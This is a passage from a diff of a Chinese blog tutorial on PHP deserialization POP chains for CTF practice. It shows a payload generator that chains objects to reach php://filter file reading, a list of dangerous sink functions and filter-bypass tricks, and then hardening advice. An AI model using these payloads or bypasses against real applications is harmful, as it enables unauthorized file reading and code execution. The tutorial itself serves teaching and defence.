<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;source = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
+
+<p>这里的重点不是死记这个 payload，而是理解对象之间的指向关系：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$b-&gt;source -&gt; $a</span><br><span class="line">$a-&gt;str -&gt; Test</span><br><span class="line">Test-&gt;p -&gt; Modifier</span><br><span class="line">Modifier-&gt;var -&gt; php://filter...</span><br></pre></td></tr></table></figure>
+
+<p>这就是 POP 链中“把多个对象拼成一条执行路径”的过程。</p>
+<h2 id="八、POP-链分析方法"><a href="#八、POP-链分析方法" class="headerlink" title="八、POP 链分析方法"></a>八、POP 链分析方法</h2><p>做 PHP 反序列化题时，可以按这个顺序分析：</p>
+<h3 id="1-找入口"><a href="#1-找入口" class="headerlink" title="1. 找入口"></a>1. 找入口</h3><p>搜索：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>])</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;x&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>确认用户是否可控。</p>
+<h3 id="2-找链尾"><a href="#2-找链尾" class="headerlink" title="2. 找链尾"></a>2. 找链尾</h3><p>优先找危险函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line"><span class="keyword">eval</span></span><br><span class="line">assert</span><br><span class="line"><span class="keyword">include</span></span><br><span class="line"><span class="keyword">require</span></span><br><span class="line">file_get_contents</span><br><span class="line">call_user_func</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-找触发器"><a href="#3-找触发器" class="headerlink" title="3. 找触发器"></a>3. 找触发器</h3><p>看危险函数在哪个魔术方法中，或者能不能被魔术方法间接触发。</p>
+<h3 id="4-连对象关系"><a href="#4-连对象关系" class="headerlink" title="4. 连对象关系"></a>4. 连对象关系</h3><p>根据属性访问和方法调用，把不同类串起来。</p>
+<h3 id="5-处理过滤"><a href="#5-处理过滤" class="headerlink" title="5. 处理过滤"></a>5. 处理过滤</h3><p>常见过滤绕过：</p>
+<ul>
+<li>URL 编码空字节。</li>
+<li>使用 <code>php://filter</code>。</li>
+<li>强弱类型比较差异。</li>
+<li><code>__wakeup()</code> 属性数量绕过。</li>
+<li>使用对象触发 <code>__toString()</code> 或 <code>__get()</code>。</li>
+</ul>
+<h2 id="九、防护建议"><a href="#九、防护建议" class="headerlink" title="九、防护建议"></a>九、防护建议</h2><p>真实业务中应避免以下写法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>加固建议：</p>
+<ul>
+<li>不对用户可控数据使用 <code>unserialize()</code>。</li>
+<li>使用 JSON 传递普通数据。</li>
+<li>如果必须反序列化，使用 <code>allowed_classes</code> 限制可反序列化类。</li>
+<li>对序列化数据做签名校验。</li>
+<li>避免在魔术方法中执行敏感操作。</li>
+<li>不在析构、字符串转换、属性读取等魔术方法中调用危险函数。</li>
+<li>对文件读取路径做白名单限制。</li>
+</ul>
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$input</span>, [<span class="string">&quot;allowed_classes&quot;</span> =&gt; <span class="literal">false</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这可以避免反序列化成对象，但仍建议优先使用 JSON。</p>
+<h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>PHP 反序列化的核心是对象生命周期和魔术方法触发。做题时不要一上来就拼 payload，而是先画出调用链：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">入口 -&gt; 触发方法 -&gt; 中间对象 -&gt; 链尾函数 -&gt; 目标效果</span><br></pre></td></tr></table></figure>
+
+<p>本文总结的三个点比较常见：</p>
+<ul>
+<li><code>__wakeup()</code> 绕过适合理解对象恢复过程。</li>
+<li>强弱类型比较适合理解 PHP 类型转换风险。</li>
+<li>POP 链适合训练从链尾反推触发路径的能力。</li>
+</ul>
+<p>理解这些之后，再遇到 PHP 反序列化题，就可以从“看源码找链”开始，而不是盲目套 payload。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>rowen</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://forkmmat.github.io/2026/05/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%AD%A6%E4%B9%A0-%E4%BB%8Ewakeup%E7%BB%95%E8%BF%87%E5%88%B0%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6/">https://forkmmat.github.io/2026/05/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%AD%A6%E4%B9%A0-%E4%BB%8Ewakeup%E7%BB%95%E8%BF%87%E5%88%B0%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/"># Web安全</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/PHP/"># PHP</a>
+                    
+                        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"># 反序列化</a>
+                    
+                        <a href="/tags/POP%E9%93%BE/"># POP链</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/05/20/Python-Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E9%98%B2%E6%8A%A4/">Python Pickle 反序列化漏洞学习与防护</a>
+            
+        </section>
+<script src="https://giscus.app/client.js"
+        data-repo="forkmmat/forkmmat.github.io"
+        data-repo-id="R_kgDOO0OA0g"
+        data-category="General"
+        data-category-id="DIC_kwDOO0OA0s4CtD6Y"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© rowen | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
